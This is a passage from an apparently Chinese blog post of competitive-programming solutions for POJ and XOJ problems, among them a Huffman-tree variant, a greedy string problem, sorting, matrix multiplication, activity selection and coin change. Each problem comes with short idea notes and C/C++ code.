class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="3253"><a href="#3253" class="headerlink" title="3253"></a>3253</h2><h3 id="题目-8"><a href="#题目-8" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=3253" target="_blank" rel="external">http://poj.org/problem?id=3253</a></p>
<h3 id="思路-8"><a href="#思路-8" class="headerlink" title="思路"></a>思路</h3><p>霍夫曼树的变形。<br>重点在于对两个最小值相加后对数组的处理。</p>
<h3 id="提交-8"><a href="#提交-8" class="headerlink" title="提交"></a>提交</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="keyword">int</span> k;</div><div class="line"><span class="keyword">int</span> len[<span class="number">20005</span>];</div><div class="line"><span class="keyword">int</span> total;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans = <span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="keyword">while</span> ( n &gt; <span class="number">1</span> )&#123;</div><div class="line">        <span class="keyword">int</span> mii1 = <span class="number">0</span>;</div><div class="line">        <span class="keyword">int</span> mii2 = <span class="number">1</span>;</div><div class="line">        <span class="keyword">if</span> (len[mii1] &gt; len[mii2])</div><div class="line">            swap(mii1,mii2);</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">2</span>; i &lt; n; i++)&#123;</div><div class="line">            <span class="keyword">if</span> (len[i] &lt; len[mii1])&#123;</div><div class="line">                mii2 = mii1;</div><div class="line">                mii1 = i;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (len[i] &lt; len[mii2])&#123;</div><div class="line">                mii2 = i;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">int</span> t = len[mii1] + len[mii2];</div><div class="line">        ans += t;</div><div class="line"></div><div class="line">        <span class="keyword">if</span> (mii1 == n<span class="number">-1</span>)</div><div class="line">            swap(mii1,mii2);</div><div class="line">        len[mii1] = t;</div><div class="line">        len[mii2] = len[n<span class="number">-1</span>];</div><div class="line">        n--;</div><div class="line"></div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%lld\n"</span>,ans);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">    total = <span class="number">0</span>;</div><div class="line">    k = <span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;len[i]);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    solve();</div><div class="line"></div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="3617"><a href="#3617" class="headerlink" title="3617"></a>3617</h2><h3 id="题目-9"><a href="#题目-9" class="headerlink" title="题目"></a>题目</h3><p><a href="http://poj.org/problem?id=3617" target="_blank" rel="external">http://poj.org/problem?id=3617</a></p>
<h3 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h3><p>贪心算法，每次选择排序靠前的字母加到字符串t中。如果两个排序相同，则看它们的下一个字母的顺序，可以使用一个递归函数来判断。</p>
<h3 id="提交-9"><a href="#提交-9" class="headerlink" title="提交"></a>提交</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">int</span> n;</div><div class="line"><span class="keyword">char</span> s[<span class="number">2005</span>];</div><div class="line"><span class="keyword">char</span> t[<span class="number">2005</span>];</div><div class="line"><span class="keyword">int</span> sp,ep;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">compare</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span>&#123;</div><div class="line">    <span class="keyword">if</span> (s[i] &gt; s[j])&#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (s[i] &lt; s[j])&#123;</div><div class="line">        <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (s[i] == s[j])&#123;</div><div class="line">        i++;</div><div class="line">        j--;</div><div class="line">        <span class="keyword">return</span> compare(i,j);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">" %c"</span>,&amp;s[i]);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    sp = <span class="number">0</span>;</div><div class="line">    ep = n<span class="number">-1</span>;</div><div class="line">    <span class="keyword">int</span> lenoft = <span class="number">0</span>;</div><div class="line">    <span class="keyword">while</span> (lenoft != n)&#123;</div><div class="line">        <span class="keyword">int</span> p = compare(sp,ep);</div><div class="line">        <span class="keyword">if</span> (p == <span class="number">0</span>)&#123;</div><div class="line">            t[lenoft] = s[sp];</div><div class="line">            sp++;</div><div class="line">            lenoft++;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (p == <span class="number">1</span>)&#123;</div><div class="line">            t[lenoft] = s[ep];</div><div class="line">            ep--;</div><div class="line">            lenoft++;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%c"</span>,t[i<span class="number">-1</span>]);</div><div class="line">        <span class="keyword">if</span> (i % <span class="number">80</span> == <span class="number">0</span>)</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h1 id="XOJ"><a href="#XOJ" class="headerlink" title="XOJ"></a>XOJ</h1><h2 id="1004"><a href="#1004" class="headerlink" title="1004"></a>1004</h2><h3 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h3><p>冒泡等可能会超时。堆排序和快排的复杂度都是 O(nlogn)。课上为了节约时间所以：）</p>
<h3 id="提交-10"><a href="#提交-10" class="headerlink" title="提交"></a>提交</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">int</span> arrays[<span class="number">1000004</span>];</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    <span class="keyword">int</span> i,j;</div><div class="line"></div><div class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; n;i++)</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;arrays[i]);</div><div class="line">    sort(arrays,arrays+n);</div><div class="line">    <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; n - <span class="number">1</span>;j++)</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d "</span>,arrays[j]);</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d"</span>,arrays[n - <span class="number">1</span>]);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>oj对格式要求好严格…</p>
<h2 id="1005"><a href="#1005" class="headerlink" title="1005"></a>1005</h2><p>此题另写一篇文章了。</p>
<h2 id="1022"><a href="#1022" class="headerlink" title="1022"></a>1022</h2><h3 id="想法-1"><a href="#想法-1" class="headerlink" title="想法"></a>想法</h3><p>直接用普通的矩阵乘法就过了，<br>时间复杂度 O(<script type="math/tex">n^3</script>)</p>
<h3 id="提交-11"><a href="#提交-11" class="headerlink" title="提交"></a>提交</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">int</span> n1,m1;</div><div class="line">    <span class="keyword">int</span> n2,m2;</div><div class="line">    <span class="keyword">int</span> matrix1[<span class="number">100</span>][<span class="number">100</span>];</div><div class="line">    <span class="keyword">int</span> matrix2[<span class="number">100</span>][<span class="number">100</span>];</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n1,&amp;m1);</div><div class="line">    <span class="keyword">int</span> i,j;</div><div class="line"></div><div class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; n1;i++)</div><div class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; m1;j++)</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;matrix1[i][j]);</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;n2,&amp;m2);</div><div class="line"></div><div class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; n2;i++)</div><div class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; m2;j++)</div><div class="line">            <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;matrix2[i][j]);</div><div class="line"></div><div class="line">    <span class="keyword">int</span> matrix3[<span class="number">100</span>][<span class="number">100</span>];</div><div class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; n1;i++)</div><div class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; m2;j++)</div><div class="line">            matrix3[i][j]=<span class="number">0</span>;</div><div class="line"></div><div class="line">    <span class="keyword">int</span> i1,j2;</div><div class="line">    <span class="keyword">for</span>(i1 = <span class="number">0</span>;i1 &lt; n1;i1++)</div><div class="line">        <span class="keyword">for</span>(j2 = <span class="number">0</span>;j2 &lt; m2;j2++)</div><div class="line">            <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; n2;j++)</div><div class="line">              matrix3[i1][j2] += matrix1[i1][j] * matrix2[j][j2];</div><div class="line"></div><div class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; n1;i++)</div><div class="line">    &#123;</div><div class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; m2 - <span class="number">1</span>;j++)</div><div class="line">            <span class="built_in">printf</span>(<span class="string">"%d "</span>,matrix3[i][j]);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,matrix3[i][m2<span class="number">-1</span>]);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1061"><a href="#1061" class="headerlink" title="1061"></a>1061</h2><h3 id="想法-2"><a href="#想法-2" class="headerlink" title="想法"></a>想法</h3><p>贪心算法。其实就是任务选择问题。</p>
<ul>
<li>按照约会完成时间从早到晚排序</li>
<li>选择具有最早完成时间的girl</li>
<li>将此girl加入到约会列表中</li>
<li>对子问题重复上述问题</li>
<li>强烈谴责Ckp</li>
</ul>
<h3 id="提交-12"><a href="#提交-12" class="headerlink" title="提交"></a>提交</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> info&#123;</div><div class="line">    <span class="keyword">char</span>  name[<span class="number">16</span>];</div><div class="line">    <span class="keyword">char</span>  starttime[<span class="number">6</span>];</div><div class="line">    <span class="keyword">char</span>  endtime[<span class="number">6</span>];</div><div class="line">&#125;info;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(info * s, <span class="keyword">int</span> l, <span class="keyword">int</span> r,<span class="keyword">int</span> n)</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> n;</div><div class="line">    <span class="keyword">static</span> info mm[<span class="number">1005</span>] ;</div><div class="line">    <span class="keyword">static</span> info mmcopy[<span class="number">1005</span>];</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    <span class="keyword">int</span> i,j;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt;= n; i++)&#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%s%s%s"</span>,mm[i].name,mm[i].starttime,mm[i].endtime);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    quick_sort(mm,<span class="number">1</span>,n,n);</div><div class="line"></div><div class="line">    <span class="built_in">strcpy</span>(mmcopy[<span class="number">1</span>].endtime,mm[<span class="number">1</span>].endtime);</div><div class="line">    <span class="built_in">strcpy</span>(mmcopy[<span class="number">1</span>].name,mm[<span class="number">1</span>].name);</div><div class="line">    <span class="built_in">strcpy</span>(mmcopy[<span class="number">1</span>].starttime,mm[<span class="number">1</span>].starttime);</div><div class="line">    <span class="keyword">int</span> cal = <span class="number">1</span>;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">2</span>; i &lt;= n; i++)&#123;</div><div class="line">        <span class="keyword">if</span> (<span class="built_in">strcmp</span>(mmcopy[cal].endtime,mm[i].starttime) &lt;= <span class="number">0</span>)&#123;</div><div class="line">            cal++;</div><div class="line">            <span class="built_in">strcpy</span>(mmcopy[cal].endtime,mm[i].endtime);</div><div class="line">            <span class="built_in">strcpy</span>(mmcopy[cal].name,mm[i].name);</div><div class="line">            <span class="built_in">strcpy</span>(mmcopy[cal].starttime,mm[i].starttime);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,cal);</div><div class="line">    <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt; cal; i++)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%s "</span>,mmcopy[i].name);</div><div class="line">    &#125;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>,mmcopy[i].name);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">quick_sort</span><span class="params">(info* s, <span class="keyword">int</span> l, <span class="keyword">int</span> r,<span class="keyword">int</span> n)</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">if</span> (l &lt; r)&#123;</div><div class="line">        <span class="keyword">int</span> i = l, j = r;</div><div class="line">        <span class="keyword">int</span> temp;</div><div class="line">        info x;</div><div class="line">        <span class="built_in">strcpy</span>(x.endtime,s[l].endtime);</div><div class="line">        <span class="built_in">strcpy</span>(x.name,s[l].name);</div><div class="line">        <span class="built_in">strcpy</span>(x.starttime,s[l].starttime);</div><div class="line">        <span class="keyword">while</span> (i &lt; j)</div><div class="line">        &#123;</div><div class="line">            <span class="keyword">while</span>(i &lt; j &amp;&amp; <span class="built_in">strcmp</span>(s[j].endtime,x.endtime) &gt;= <span class="number">0</span>)</div><div class="line">                j--;</div><div class="line">            <span class="keyword">if</span>(i &lt; j)&#123;</div><div class="line">                <span class="built_in">strcpy</span>(s[i].endtime,s[j].endtime);</div><div class="line">                <span class="built_in">strcpy</span>(s[i].starttime,s[j].starttime);</div><div class="line">                <span class="built_in">strcpy</span>(s[i].name , s[j].name);</div><div class="line">                i++;</div><div class="line">            &#125;</div><div class="line"></div><div class="line">            <span class="keyword">while</span>(i &lt; j &amp;&amp; <span class="built_in">strcmp</span>(s[i].endtime,x.endtime) &lt; <span class="number">0</span>)</div><div class="line">                i++;</div><div class="line">            <span class="keyword">if</span>(i &lt; j)&#123;</div><div class="line"></div><div class="line">                <span class="built_in">strcpy</span>(s[j].endtime,s[i].endtime);</div><div class="line">                <span class="built_in">strcpy</span>(s[j].starttime,s[i].starttime);</div><div class="line">                <span class="built_in">strcpy</span>(s[j].name,s[i].name);</div><div class="line">                j--;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="built_in">strcpy</span>(s[i].endtime,x.endtime);</div><div class="line">        <span class="built_in">strcpy</span>(s[i].starttime,x.starttime);</div><div class="line">        <span class="built_in">strcpy</span>(s[i].name,x.name);</div><div class="line"></div><div class="line">        quick_sort(s, l, i - <span class="number">1</span>,n);</div><div class="line">        quick_sort(s, i + <span class="number">1</span>, r,n);</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1062"><a href="#1062" class="headerlink" title="1062"></a>1062</h2><h3 id="想法-3"><a href="#想法-3" class="headerlink" title="想法"></a>想法</h3><p>贪心算法。背包问题。尽量选择面值大的。<br>将元转换为角，这样都是整数，进行处理更方便。</p>
<h3 id="提交-13"><a href="#提交-13" class="headerlink" title="提交"></a>提交</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> zhibi&#123;</div><div class="line">    <span class="keyword">int</span> number;</div><div class="line">    <span class="keyword">int</span> value;</div><div class="line">&#125;zhibi;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> stat = <span class="number">0</span>;</div><div class="line">    <span class="keyword">int</span> n;</div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;n);</div><div class="line">    zhibi arr[<span class="number">7</span>];</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">7</span>; i++)&#123;</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>,&amp;arr[i].number);</div><div class="line">    &#125;</div><div class="line">    arr[<span class="number">1</span>].value = <span class="number">500</span>;</div><div class="line">    arr[<span class="number">2</span>].value = <span class="number">100</span>;</div><div class="line">    arr[<span class="number">3</span>].value = <span class="number">50</span>;</div><div class="line">    arr[<span class="number">4</span>].value = <span class="number">10</span>;</div><div class="line">    arr[<span class="number">5</span>].value = <span class="number">5</span>;</div><div class="line">    arr[<span class="number">6</span>].value = <span class="number">1</span>;</div><div class="line"></div><div class="line">    <span class="keyword">int</span> remainMoney;</div><div class="line">    remainMoney = <span class="number">1000</span> - n * <span class="number">25</span>;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; <span class="number">7</span>; i++)&#123;</div><div class="line">        <span class="keyword">if</span> (remainMoney == <span class="number">0</span>)&#123;</div><div class="line">            <span class="keyword">break</span>;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">else</span></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">int</span> j = remainMoney / arr[i].value;</div><div class="line">            <span class="keyword">int</span> number = j&gt;arr[i].number?arr[i].number:j;</div><div class="line">            remainMoney = remainMoney - number*arr[i].value;</div><div class="line">            stat = stat + number;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> (remainMoney == <span class="number">0</span>)&#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d"</span>,stat);</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">else</span></div><div class="line">    &#123;</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"-1\n"</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h2 id="1075"><a href="#1075" class="headerlink" title="1075"></a>1075</h2><h3 id="思路-10"><a href="#思路-10" class="headerlink" title="思路"></a>思路</h3><p>直接dijkstra。 采用邻接矩阵存储。</p>
<h3 id="提交-14"><a href="#提交-14" class="headerlink" title="提交"></a>提交</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span 